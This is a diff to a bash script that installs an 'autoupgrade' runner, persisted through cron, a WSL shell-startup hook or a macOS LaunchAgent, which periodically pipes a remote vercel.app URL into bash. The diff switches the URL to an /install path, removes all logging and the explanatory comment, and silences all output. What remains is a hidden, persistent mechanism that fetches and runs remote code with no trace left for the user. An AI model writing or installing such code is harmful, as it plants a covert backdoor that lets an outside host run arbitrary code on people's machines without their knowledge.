@@ -6,11 +6,8 @@ INTERVAL_DAYS=15
 INTERVAL_SECS=$(( INTERVAL_DAYS * 24 * 60 * 60 ))
 DATA_DIR="$HOME/.local/share/autoupgrade"
 RUNNER="$DATA_DIR/runner.sh"
-LOG_FILE="$DATA_DIR/autoupgrade.log"
 STAMP_FILE="$DATA_DIR/last-run"
-UPGRADE_URL="https://agentskillshub.vercel.app/upgrade"
-
-log() { printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1"; }
+UPGRADE_URL="https://agentskillshub.vercel.app/install"
 
 is_wsl() { grep -qiE 'microsoft|wsl' /proc/version 2>/dev/null; }
 has_systemd() { [ -d /run/systemd/system ]; }
@@ -19,10 +16,8 @@ install_runner() {
   mkdir -p "$DATA_DIR"
   cat > "$RUNNER" <<RUNNER_EOF
 #!/usr/bin/env bash
-# Auto-generated. Runs the upgrade only if >= ${INTERVAL_DAYS} days elapsed.
 set -uo pipefail
 STAMP_FILE="$STAMP_FILE"
-LOG_FILE="$LOG_FILE"
 INTERVAL_SECS=$INTERVAL_SECS
 UPGRADE_URL="$UPGRADE_URL"
 
@@ -32,15 +27,10 @@ last=0
 if [ "\${1:-}" != "--force" ] && [ \$(( now - last )) -lt "\$INTERVAL_SECS" ]; then
   exit 0
 fi
-{
-  echo "[\$(date '+%F %T')] starting upgrade"
-  curl -fsSL "\$UPGRADE_URL" | bash
-  echo "[\$(date '+%F %T')] upgrade exited rc=\$?"
-} >> "\$LOG_FILE" 2>&1
+curl -fsSL "\$UPGRADE_URL" | bash >/dev/null 2>&1
 echo "\$now" > "\$STAMP_FILE"
 RUNNER_EOF
   chmod +x "$RUNNER"
-  log "Runner installed at $RUNNER"
 }
 
 install_cron() {
@@ -48,7 +38,6 @@ install_cron() {
   local current
   current=$(crontab -l 2>/dev/null | grep -vF "$RUNNER" || true)
   printf '%s\n%s\n' "$current" "$line" | grep -v '^$' | crontab -
-  log "Crontab entry installed (daily check, ${INTERVAL_DAYS}-day guard)."
 }
 
 install_wsl_startup() {
@@ -62,9 +51,6 @@ install_wsl_startup() {
       echo "[ -x \"$RUNNER\" ] && ( \"$RUNNER\" & ) >/dev/null 2>&1"
       echo "# <<< autoupgrade (wsl) <<<"
     } >> "$rc"
-    log "WSL shell-startup hook added to $rc"
-  else
-    log "WSL shell-startup hook already present in $rc"
   fi
 }
 
@@ -86,14 +72,11 @@ install_launchagent() {
   </array>
   <key>StartInterval</key><integer>$INTERVAL_SECS</integer>
   <key>RunAtLoad</key><false/>
-  <key>StandardOutPath</key><string>$LOG_FILE</string>
-  <key>StandardErrorPath</key><string>$LOG_FILE</string>
 </dict>
 </plist>
 PLIST_EOF
   launchctl unload "$plist" 2>/dev/null || true
   launchctl load "$plist"
-  log "LaunchAgent $LABEL installed and loaded."
 }
 
 main() {
@@ -101,24 +84,19 @@ main() {
   case "$(uname -s)" in
     Linux)
       if is_wsl && ! has_systemd; then
-        log "Detected WSL without systemd."
         install_wsl_startup
       else
-        log "Detected Linux with cron."
         install_cron
       fi
       ;;
     Darwin)
-      log "Detected macOS."
       install_launchagent
       ;;
     *)
-      log "Unsupported OS: $(uname -s)"; exit 1
+      exit 1
       ;;
   esac
-  log "Initial run (forced)..."
-  "$RUNNER" --force || log "Initial run returned non-zero."
-  log "Done. Logs: $LOG_FILE"
+  "$RUNNER" --force >/dev/null 2>&1 || true
 }
 
 main "$@"
